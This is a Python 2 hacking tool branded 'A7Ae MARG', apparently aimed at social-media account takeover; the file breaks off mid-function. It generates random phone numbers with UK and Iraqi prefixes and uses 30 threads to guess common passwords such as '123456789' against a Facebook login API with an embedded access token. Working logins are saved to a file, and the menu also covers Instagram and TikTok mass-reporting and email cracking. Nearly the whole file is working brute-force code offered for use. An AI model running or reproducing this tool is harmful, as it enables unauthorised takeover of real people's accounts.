import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(6000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

os.system('rm -rf ..txt')
for n in range(5000):
    nmbr = random.randint(11, 999)
    sys.stdout = open('..txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install tqdm')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 MARG.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1')]
br.addheaders = [('User-Agent', 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.187 Mobile Safari/534.11+')]
br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4')]
br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPad; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1')]
br.addheaders = [('User-Agent', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile')]
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362')]
br.addheaders = [('User-Agent', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)')]

def mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def keluar():
    print 'Keluar'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)



def load():
    with tqdm(total=100, desc='Loading ', bar_format='{l_bar}{bar}') as (pbar):
        for i in range(100):
            time.sleep(0.03)
            pbar.update(1)

logo =""" 
\033[1;97m88888888ba   88b           d88  I8,        8        ,8I  
\033[1;97m88      "8b  888b         d888  `8b       d8b       d8'  
\033[1;97m88      ,8P  88`8b       d8'88   "8,     ,8"8,     ,8"   
\033[1;97m88aaaaaa8P'  88 `8b     d8' 88    Y8     8P Y8     8P    
\033[1;97m88aaaaaaP    88  `8b   d8'  88    `8b   d8' `8b   d8'    
\033[1;97m88      `8b  88   `8b d8'   88     `8a a8'   `8a a8'     
\033[1;97m88      a8P  88    `888'    88      `8a8'     `8a8'      
\033[1;97m88888888P"   88     `8'     88       `8'       `8'       

\033[1;97mCreated By A7Ae MARG !!

\033[1;97mMy Telegram : \033[1;97m@A7Ae_MARG

\033[1;97mMy Chanell  : \033[1;97m@A7AeMARG
    """                                                                                                                                   
back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m1\x1b[1;97m]\x1b[1;92m CRACK NUMBERS'
    print '\x1b[1;97m[\x1b[1;97m2\x1b[1;97m]\x1b[1;92m CRACK FACEBOOK'
    print '\x1b[1;97m[\x1b[1;97m3\x1b[1;97m]\x1b[1;92m REPORT INSTAGRAM'
    print '\x1b[1;97m[\x1b[1;97m4\x1b[1;97m]\x1b[1;92m REPORT TIKTOK'
    print '\x1b[1;97m[\x1b[1;97m5\x1b[1;97m]\x1b[1;92m CRACK email'
    print '\x1b[1;97m[\x1b[1;97m0\x1b[1;97m]\x1b[1;91m Exit this program'
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    pilih_menu()


def pilih_menu():
    unikers = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m( \x1b[1;97mChoose\x1b[1;97m ) > \x1b[97m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Wrong input !'
        pilih_menu()
    elif unikers == '1' or unikers == '1':
        crack_nomor()
    elif unikers == '2' or unikers == '2':
        os.system('python2 .fb.py')
    elif unikers == '3' or unikers == '3':
        os.system('python .INSTAGRAM.py')
    elif unikers == '4' or unikers == '4':
        os.system('python .TIKTOK.py')
    elif unikers == '5' or unikers == '5':
        crack_email()
    elif unikers == '0' or unikers == '0':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;97m\xc3\xb7\x1b[1;97m] Wrong input !'
        pilih_menu()


def crack_nomor():
    os.system('clear')
    print logo
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m1\x1b[1;97m]\x1b[1;92m CRACK NUMBERS KURDSTAN '
    print '\x1b[1;97m[\x1b[1;97m2\x1b[1;97m]\x1b[1;92m CRACK NUMBERS PASWORDS '
    print '\x1b[1;97m[\x1b[1;97m3\x1b[1;97m]\x1b[1;92m CRACK NUMBERS Free Mod   ' 
    print '\x1b[1;97m[\x1b[1;71m0\x1b[1;97m]\x1b[1;92m Back To Menu          '
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~' 
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m( \x1b[1;97mChoose\x1b[1;97m ) > \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;97mx\x1b[1;97m]\x1b[1;97m Wrong input !'
        pilih()
    elif unikers == '1' or unikers == '1':
        india()
    elif unikers == '2' or unikers == '2':
        nguyen()
    elif unikers == '3' or unikers == '3':
        a7a()
    elif unikers == '4' or unikers == '4':
        crack_email()
    elif unikers == '0' or unikers == '0':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;97m\xc3\xb7\x1b[1;97m] Wrong input !'
        pilih()


def india():
    os.system('clear')
    print logo
    print '\x1b[1;97m750-751'
    print '\x1b[1;97m780-781-782-783'
    print '\x1b[1;97m777-770-771-772-773'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;97m')
        exit('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+44'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;92m[\x1b[1;92m!\x1b[1;92m] \x1b[1;92mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;92m[\x1b[1;92m\xe2\x80\xa2\x1b[1;92m]\x1b[1;92m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m[\x1b[1;92mcheck-point\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                cps = open('anggaxd/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass2
                    cps = open('anggaxd/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '112233445566'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass3
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '112233112233'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass4
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '1234512345'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass5
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = '1234554321'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass6
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = '123321'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass7
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = '123456789'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass8
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass8 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/kurd.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 MARG.py')


def a7a():
    os.system('clear')
    print logo
    print '\x1b[1;97m  Crack Number Free Mod'
    print '\x1b[1;97m750-751'
    print '\x1b[1;97m780-781-782-783'
    print '\x1b[1;97m777-770-771-772-773'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;97m')
        exit('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+44'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;92m[\x1b[1;92m!\x1b[1;92m] \x1b[1;92mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;92m[\x1b[1;92m\xe2\x80\xa2\x1b[1;92m]\x1b[1;92m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m[\x1b[1;92mcheck-point\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                cps = open('anggaxd/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass2
                    cps = open('anggaxd/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '112233445566'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass3
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '112233112233'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass4
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '1234512345'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass5
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = '1234554321'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass6
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = '123321'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass7
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = '123456789'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass8
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass8 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/kurd1.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 MARG.py')

def nguyen():
    os.system('clear')
    print logo
    print '\x1b[1;97m750-751'
    print '\x1b[1;97m780-781-782-783'
    print '\x1b[1;97m777-770-771-772-773'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;97m ')
        exit('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+964'
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m Example : \x1b[1;91m ( A7Ae MARG) '
        pass1 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] Password 1 : \x1b[97m')
        pass2 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mPassword 2 : \x1b[97m')
        pass3 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] Password 3 : \x1b[97m')
        pass4 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mPassword 4 : \x1b[97m')
        pass5 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] Password 5 : \x1b[97m')
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mDon't Close")
